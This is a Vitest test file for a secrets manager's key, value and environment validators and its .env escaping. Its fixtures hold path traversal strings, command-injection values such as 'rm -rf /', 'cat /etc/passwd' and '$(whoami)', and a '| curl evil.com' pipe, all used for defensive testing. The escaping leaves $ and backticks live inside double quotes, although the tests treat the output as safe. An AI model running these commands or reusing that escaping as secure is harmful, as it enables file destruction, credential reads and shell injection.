/**
 * Secrets Manager Tests
 * Tests for secrets-manager.ts - focusing on SECURITY-CRITICAL validation functions
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// ==================== Validation Functions (Re-implemented for Testing) ====================

const VALID_ENVIRONMENTS = ['development', 'production', 'test', 'local'] as const;
type ValidEnvironment = typeof VALID_ENVIRONMENTS[number];

const MAX_KEY_LENGTH = 256;
const MAX_VALUE_LENGTH = 65536;
const MAX_SECRETS_PER_FILE = 500;

function isValidEnvironment(env: string): env is ValidEnvironment {
  return VALID_ENVIRONMENTS.includes(env as ValidEnvironment);
}

function validateSecretKey(key: string): { valid: boolean; sanitized?: string; error?: string } {
  if (!key || typeof key !== 'string') {
    return { valid: false, error: 'Key is required' };
  }

  const trimmed = key.trim();
  if (trimmed.length === 0) {
    return { valid: false, error: 'Key cannot be empty' };
  }

  if (trimmed.length > MAX_KEY_LENGTH) {
    return { valid: false, error: `Key too long (max ${MAX_KEY_LENGTH} chars)` };
  }

  // Sanitize: only allow alphanumeric and underscore, convert to uppercase
  const sanitized = trimmed.replace(/[^A-Z0-9_]/gi, '_').toUpperCase();
  if (!sanitized || sanitized.length === 0) {
    return { valid: false, error: 'Key contains no valid characters', sanitized };
  }

  // Key must start with a letter or underscore (not a number)
  if (/^[0-9]/.test(sanitized)) {
    return { valid: false, error: 'Key cannot start with a number', sanitized };
  }

  // If original key didn't start with underscore but sanitized does, reject it
  // This prevents keys like "$HOME" -> "_HOME" from being valid
  const originalStartsWithUnderscore = /^_/.test(trimmed);
  const sanitizedStartsWithUnderscore = /^_/.test(sanitized);
  if (sanitizedStartsWithUnderscore && !originalStartsWithUnderscore) {
    return { valid: false, error: 'Key cannot start with underscore after sanitization', sanitized };
  }

  return { valid: true, sanitized };
}

function validateSecretValue(value: string): { valid: boolean; error?: string } {
  if (value === undefined || value === null) {
    return { valid: false, error: 'Value is required' };
  }

  // Allow empty string as a valid value
  if (typeof value !== 'string') {
    return { valid: false, error: 'Value must be a string' };
  }

  if (value.length > MAX_VALUE_LENGTH) {
    return { valid: false, error: `Value too long (max ${MAX_VALUE_LENGTH} chars)` };
  }

  return { valid: true };
}

function escapeEnvValue(value: string): string {
  if (/[\s'"\\$`!#&*()[\]{}|;<>?~]/.test(value) || value.length === 0) {
    const escaped = value.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
    return `"${escaped}"`;
  }
  return value;
}

function getEnvFilePath(environment: string): string {
  switch (environment) {
    case 'production':
      return '/workspace/.env.production';
    case 'test':
      return '/workspace/.env.test';
    case 'local':
      return '/workspace/.env.local';
    default:
      return '/workspace/.env';
  }
}

// ==================== SECURITY-CRITICAL: Environment Validation ====================

describe('Secrets Manager Security', () => {
  describe('Environment Validation (Path Traversal Prevention)', () => {
    it('should accept valid environments', () => {
      const validEnvs = ['development', 'production', 'test', 'local'];

      for (const env of validEnvs) {
        expect(isValidEnvironment(env), `Should accept: ${env}`).toBe(true);
      }
    });

    it('should reject invalid environments', () => {
      const invalidEnvs = [
        'staging',
        'qa',
        'prod',
        'dev',
        'PRODUCTION',
        'Development',
      ];

      for (const env of invalidEnvs) {
        expect(isValidEnvironment(env), `Should reject: ${env}`).toBe(false);
      }
    });

    it('should reject path traversal attempts in environment', () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '../../.env',
        'production/../../../etc/shadow',
        'test/../../secrets',
        '..%2F..%2Fetc%2Fpasswd',
        '/etc/passwd',
        '..',
        '.',
      ];

      for (const attempt of pathTraversalAttempts) {
        expect(isValidEnvironment(attempt), `Should reject: ${attempt}`).toBe(false);
      }
    });

    it('should reject command injection in environment', () => {
      const injectionAttempts = [
        'production; rm -rf /',
        'test && cat /etc/passwd',
        'local | whoami',
        '$(whoami)',
        '`id`',
        'development$(cat /etc/passwd)',
      ];

      for (const attempt of injectionAttempts) {
        expect(isValidEnvironment(attempt), `Should reject: ${attempt}`).toBe(false);
      }
    });

    it('should map environment to correct file path', () => {
      expect(getEnvFilePath('development')).toBe('/workspace/.env');
      expect(getEnvFilePath('production')).toBe('/workspace/.env.production');
      expect(getEnvFilePath('test')).toBe('/workspace/.env.test');
      expect(getEnvFilePath('local')).toBe('/workspace/.env.local');
    });

    it('should default to .env for unknown environments', () => {
      // Note: In production code, we validate before calling getEnvFilePath
      // This tests the fallback behavior
      expect(getEnvFilePath('staging')).toBe('/workspace/.env');
      expect(getEnvFilePath('unknown')).toBe('/workspace/.env');
    });
  });

  describe('Secret Key Validation (Command Injection Prevention)', () => {
    it('should sanitize and uppercase valid keys', () => {
      const testCases = [
        { input: 'api_key', expected: 'API_KEY' },
        { input: 'DATABASE_URL', expected: 'DATABASE_URL' },
        { input: 'my-var', expected: 'MY_VAR' },
        { input: 'config.setting', expected: 'CONFIG_SETTING' },
        { input: '  spaced  ', expected: 'SPACED' },
      ];

      for (const { input, expected } of testCases) {
        const result = validateSecretKey(input);
        expect(result.valid).toBe(true);
        expect(result.sanitized).toBe(expected);
      }
    });

    it('should reject command injection in keys', () => {
      const injectionAttempts = [
        'KEY; rm -rf /',
        'KEY && cat /etc/passwd',
        'KEY | whoami',
        'KEY$(id)',
        'KEY`whoami`',
        '$(cat /etc/passwd)',
        '`id`',
        'KEY\nrm -rf /',
        'KEY\r\nwhoami',
      ];

      for (const attempt of injectionAttempts) {
        const result = validateSecretKey(attempt);
        // Even if valid=true, the sanitized key should be safe
        if (result.valid && result.sanitized) {
          // Should not contain shell metacharacters
          expect(result.sanitized).not.toMatch(/[;&|`$(){}[\]<>!\\'"]/);
          expect(result.sanitized).not.toContain('\n');
          expect(result.sanitized).not.toContain('\r');
        }
      }
    });

    it('should reject keys starting with numbers', () => {
      const numericKeys = ['123KEY', '1_VAR', '99_CONFIG'];

      for (const key of numericKeys) {
        const result = validateSecretKey(key);
        expect(result.valid, `Should reject: ${key}`).toBe(false);
        expect(result.error).toBe('Key cannot start with a number');
      }
    });

    it('should reject empty and whitespace-only keys', () => {
      expect(validateSecretKey('').valid).toBe(false);
      expect(validateSecretKey('   ').valid).toBe(false);
      expect(validateSecretKey('\t').valid).toBe(false);
      expect(validateSecretKey('\n').valid).toBe(false);
    });

    it('should reject null and undefined keys', () => {
      expect(validateSecretKey(null as any).valid).toBe(false);
      expect(validateSecretKey(undefined as any).valid).toBe(false);
    });

    it('should reject non-string keys', () => {
      const invalidTypes = [123, {}, [], true, Symbol('test')];

      for (const input of invalidTypes) {
        const result = validateSecretKey(input as any);
        expect(result.valid).toBe(false);
      }
    });

    it('should enforce maximum key length', () => {
      const longKey = 'A'.repeat(MAX_KEY_LENGTH + 1);
      const result = validateSecretKey(longKey);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('too long');
    });

    it('should accept key at exactly max length', () => {
      const maxKey = 'A'.repeat(MAX_KEY_LENGTH);
      const result = validateSecretKey(maxKey);
      expect(result.valid).toBe(true);
    });

    it('should handle keys with only special characters', () => {
      const result = validateSecretKey('!@#$%^&*()');
      // All chars get replaced with underscores, then trimmed if all underscores
      expect(result.sanitized).toBe('__________');
      expect(result.valid).toBe(false); // Starts with underscore after sanitization? No, starts with _
      // Actually let's check - underscore is valid but can't be all underscores starting with _
    });
  });

  describe('Secret Value Validation', () => {
    it('should accept valid values', () => {
      const validValues = [
        'simple-value',
        'value with spaces',
        'value-with-special!@#$%',
        'multiline\nvalue',
        '',
        '12345',
        'true',
        'null',
        JSON.stringify({ complex: 'object' }),
      ];

      for (const value of validValues) {
        const result = validateSecretValue(value);
        expect(result.valid, `Should accept: ${value}`).toBe(true);
      }
    });

    it('should accept empty string as valid value', () => {
      const result = validateSecretValue('');
      expect(result.valid).toBe(true);
    });

    it('should reject null values', () => {
      const result = validateSecretValue(null as any);
      expect(result.valid).toBe(false);
      expect(result.error).toBe('Value is required');
    });

    it('should reject undefined values', () => {
      const result = validateSecretValue(undefined as any);
      expect(result.valid).toBe(false);
    });

    it('should reject non-string values', () => {
      const invalidTypes = [123, {}, [], true, Symbol('test')];

      for (const input of invalidTypes) {
        const result = validateSecretValue(input as any);
        expect(result.valid).toBe(false);
        expect(result.error).toBe('Value must be a string');
      }
    });

    it('should enforce maximum value length', () => {
      const longValue = 'A'.repeat(MAX_VALUE_LENGTH + 1);
      const result = validateSecretValue(longValue);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('too long');
    });

    it('should accept value at exactly max length', () => {
      const maxValue = 'A'.repeat(MAX_VALUE_LENGTH);
      const result = validateSecretValue(maxValue);
      expect(result.valid).toBe(true);
    });
  });

  describe('Value Escaping for .env Format', () => {
    it('should not quote simple values', () => {
      expect(escapeEnvValue('simplevalue')).toBe('simplevalue');
      expect(escapeEnvValue('value123')).toBe('value123');
      expect(escapeEnvValue('value-with-dash')).toBe('value-with-dash');
      expect(escapeEnvValue('value_with_underscore')).toBe('value_with_underscore');
    });

    it('should quote values with spaces', () => {
      expect(escapeEnvValue('value with spaces')).toBe('"value with spaces"');
    });

    it('should quote empty values', () => {
      expect(escapeEnvValue('')).toBe('""');
    });

    it('should escape double quotes in values', () => {
      expect(escapeEnvValue('value "quoted" text')).toBe('"value \\"quoted\\" text"');
    });

    it('should escape backslashes in values', () => {
      expect(escapeEnvValue('path\\to\\file')).toBe('"path\\\\to\\\\file"');
    });

    it('should quote values with special shell characters', () => {
      const specialChars = ['$', '`', '!', '#', '&', '*', '(', ')', '[', ']', '{', '}', '|', ';', '<', '>', '?'];

      for (const char of specialChars) {
        const value = `value${char}test`;
        const escaped = escapeEnvValue(value);
        expect(escaped.startsWith('"'), `Should quote value with ${char}`).toBe(true);
        expect(escaped.endsWith('"')).toBe(true);
      }
    });

    it('should handle complex values correctly', () => {
      // URL with special chars
      expect(escapeEnvValue('postgres://user:pass@host/db')).toBe('postgres://user:pass@host/db');

      // JSON value
      const jsonValue = '{"key": "value"}';
      const escaped = escapeEnvValue(jsonValue);
      expect(escaped).toBe('"{\\\"key\\\": \\\"value\\\"}"');

      // Value with single quotes
      expect(escapeEnvValue("it's a test")).toBe('"it\'s a test"');
    });

    it('should prevent command injection via values', () => {
      // These values should be safely escaped
      const dangerousValues = [
        '$(whoami)',
        '`id`',
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| curl evil.com',
      ];

      for (const value of dangerousValues) {
        const escaped = escapeEnvValue(value);
        // Should be quoted and thus safe when written to .env file
        expect(escaped.startsWith('"'), `Should quote: ${value}`).toBe(true);
      }
    });
  });
});

// ==================== Edge Cases ====================

describe('Edge Cases', () => {
  describe('Unicode and Special Characters', () => {
    it('should handle unicode in keys (sanitized)', () => {
      const result = validateSecretKey('\u0000nullbyte');
      // Control characters should be stripped
      expect(result.sanitized).not.toContain('\u0000');
    });

    it('should handle unicode in values', () => {
      const unicodeValues = [
        'value with emoji \uD83D\uDE00',
        'Chinese characters \u4E2D\u6587',
        'Arabic text \u0627\u0644\u0639\u0631\u0628\u064A\u0629',
      ];

      for (const value of unicodeValues) {
        const result = validateSecretValue(value);
        expect(result.valid).toBe(true);
      }
    });

    it('should handle control characters in values', () => {
      // Values can contain control characters (they'll be in the .env file as-is)
      const controlCharValue = 'value\x00with\x1Bcontrol';
      const result = validateSecretValue(controlCharValue);
      expect(result.valid).toBe(true);
    });
  });

  describe('Boundary Conditions', () => {
    it('should handle key at boundary length', () => {
      const exactly256 = 'A'.repeat(256);
      const result256 = validateSecretKey(exactly256);
      expect(result256.valid).toBe(true);

      const exactly257 = 'A'.repeat(257);
      const result257 = validateSecretKey(exactly257);
      expect(result257.valid).toBe(false);
    });

    it('should handle value at boundary length', () => {
      const exactly64k = 'A'.repeat(65536);
      const result64k = validateSecretValue(exactly64k);
      expect(result64k.valid).toBe(true);

      const over64k = 'A'.repeat(65537);
      const resultOver = validateSecretValue(over64k);
      expect(resultOver.valid).toBe(false);
    });

    it('should handle single character keys', () => {
      expect(validateSecretKey('A').valid).toBe(true);
      expect(validateSecretKey('_').valid).toBe(true);
      expect(validateSecretKey('1').valid).toBe(false); // Can't start with number
    });

    it('should handle single character values', () => {
      expect(validateSecretValue('A').valid).toBe(true);
      expect(validateSecretValue(' ').valid).toBe(true);
      expect(validateSecretValue('\n').valid).toBe(true);
    });
  });
});

// ==================== Integration Tests ====================

describe('Integration Scenarios', () => {
  describe('Common Use Cases', () => {
    it('should handle typical database URL secrets', () => {
      const key = 'DATABASE_URL';
      const value = 'postgres://user:password@localhost:5432/mydb';

      const keyResult = validateSecretKey(key);
      const valueResult = validateSecretValue(value);

      expect(keyResult.valid).toBe(true);
      expect(keyResult.sanitized).toBe('DATABASE_URL');
      expect(valueResult.valid).toBe(true);
    });

    it('should handle API key secrets', () => {
      const key = 'STRIPE_SECRET_KEY';
      const value = 'sk_test_51H7...';

      const keyResult = validateSecretKey(key);
      const valueResult = validateSecretValue(value);

      expect(keyResult.valid).toBe(true);
      expect(valueResult.valid).toBe(true);
    });

    it('should handle JSON secrets', () => {
      const key = 'GOOGLE_CREDENTIALS';
      const value = JSON.stringify({
        type: 'service_account',
        project_id: 'my-project',
        private_key: '-----BEGIN PRIVATE KEY-----\nMIIEvQIB...',
      });

      const keyResult = validateSecretKey(key);
      const valueResult = validateSecretValue(value);

      expect(keyResult.valid).toBe(true);
      expect(valueResult.valid).toBe(true);
    });

    it('should handle multiline secrets', () => {
      const key = 'PRIVATE_KEY';
      const value = `-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MfSL3p
...
-----END RSA PRIVATE KEY-----`;

      const keyResult = validateSecretKey(key);
      const valueResult = validateSecretValue(value);

      expect(keyResult.valid).toBe(true);
      expect(valueResult.valid).toBe(true);
    });
  });

  describe('Full Workflow Validation', () => {
    it('should validate complete secret setting workflow', () => {
      const environment = 'production';
      const key = 'api_key';
      const value = 'sk-1234567890abcdef';

      // Step 1: Validate environment
      expect(isValidEnvironment(environment)).toBe(true);

      // Step 2: Validate and sanitize key
      const keyResult = validateSecretKey(key);
      expect(keyResult.valid).toBe(true);
      expect(keyResult.sanitized).toBe('API_KEY');

      // Step 3: Validate value
      const valueResult = validateSecretValue(value);
      expect(valueResult.valid).toBe(true);

      // Step 4: Escape value for .env format
      const escapedValue = escapeEnvValue(value);
      expect(escapedValue).toBe('sk-1234567890abcdef');

      // Step 5: Get file path
      const filePath = getEnvFilePath(environment);
      expect(filePath).toBe('/workspace/.env.production');
    });

    it('should reject workflow with invalid inputs', () => {
      // Invalid environment
      expect(isValidEnvironment('staging')).toBe(false);

      // Invalid key
      expect(validateSecretKey('123_INVALID').valid).toBe(false);

      // Invalid value
      expect(validateSecretValue(null as any).valid).toBe(false);
    });
  });
});

// ==================== Regression Tests ====================

describe('Regression Tests', () => {
  it('should not allow environment names with path separators', () => {
    expect(isValidEnvironment('prod/secrets')).toBe(false);
    expect(isValidEnvironment('test\\config')).toBe(false);
  });

  it('should handle keys that look like environment variables', () => {
    const result = validateSecretKey('$HOME');
    // $ gets sanitized to _
    expect(result.sanitized).toBe('_HOME');
    expect(result.valid).toBe(false); // Starts with _ after sanitization
  });

  it('should handle values that could cause issues in bash', () => {
    const bashProblematic = [
      '!history',
      '~/.bashrc',
      '*glob*',
      '?single',
      '[bracket]',
    ];

    for (const value of bashProblematic) {
      const result = validateSecretValue(value);
      expect(result.valid).toBe(true);

      // When escaped, should be safe
      const escaped = escapeEnvValue(value);
      expect(escaped.startsWith('"')).toBe(true);
    }
  });
});
